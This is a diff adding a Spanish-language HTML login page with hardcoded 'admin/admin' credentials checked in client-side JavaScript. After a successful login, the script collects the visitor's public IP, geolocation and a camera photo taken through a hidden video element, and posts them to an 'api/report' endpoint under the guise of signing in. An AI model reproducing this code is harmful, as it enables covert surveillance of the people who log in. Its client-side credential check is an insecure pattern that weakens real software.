@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <link rel="stylesheet" href="estilos.css">
+</head>
+<body>
+  <div class="container">
+    <h1>🔐 Iniciar sesión (admin/admin)</h1>
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="username">Usuario</label>
+        <input type="text" id="username" required>
+      </div>
+
+      <div class="form-group">
+        <label for="password">Contraseña</label>
+        <input type="password" id="password" required>
+      </div>
+
+      <button type="submit">Entrar</button>
+      <p id="loginStatus"></p>
+    </form>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+  </div>
+
+  <script>
+  document.getElementById('loginForm').addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    const status = document.getElementById('loginStatus');
+
+    if (username === "admin" && password === "admin") {
+      status.innerText = "🔄 Solicitando permisos...";
+
+      let ip = "Desconocida";
+      let lat = null;
+      let lng = null;
+      let imageBase64 = null;
+
+      try {
+        // IP pública
+        ip = await fetch("https://api.ipify.org?format=json")
+          .then(res => res.json())
+          .then(data => data.ip);
+      } catch (err) {
+        console.warn("No se pudo obtener la IP.");
+      }
+
+      try {
+        // Geolocalización
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 })
+        );
+        lat = pos.coords.latitude;
+        lng = pos.coords.longitude;
+      } catch (err) {
+        console.warn("No se pudo obtener ubicación.");
+      }
+
+      try {
+        // Cámara
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        await new Promise(res => setTimeout(res, 1000));
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        const blob = await imageCapture.takePhoto();
+
+        imageBase64 = await new Promise(resolve => {
+          const reader = new FileReader();
+          reader.onloadend = () => resolve(reader.result);
+          reader.readAsDataURL(blob);
+        });
+
+        // Detener cámara para liberar recurso
+        track.stop();
+      } catch (err) {
+        console.warn("No se pudo acceder a la cámara.");
+      }
+
+      try {
+        // Enviar al servidor (lo que haya)
+        const payload = {
+          ip: ip,
+          lat: lat,
+          lng: lng,
+          photo: imageBase64
+        };
+
+        await fetch('api/report', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        status.innerText = "📡 Datos enviados. Accediendo...";
+      } catch (err) {
+        status.innerText = "⚠️ No se pudieron enviar los datos, pero puedes continuar.";
+      }
+
+      setTimeout(() => {
+        window.location.href = "main.html";
+      }, 1000);
+
+    } else {
+      status.innerText = "❌ Usuario o contraseña incorrectos.";
+    }
+  });
+</script>
+
+</body>
+</html>
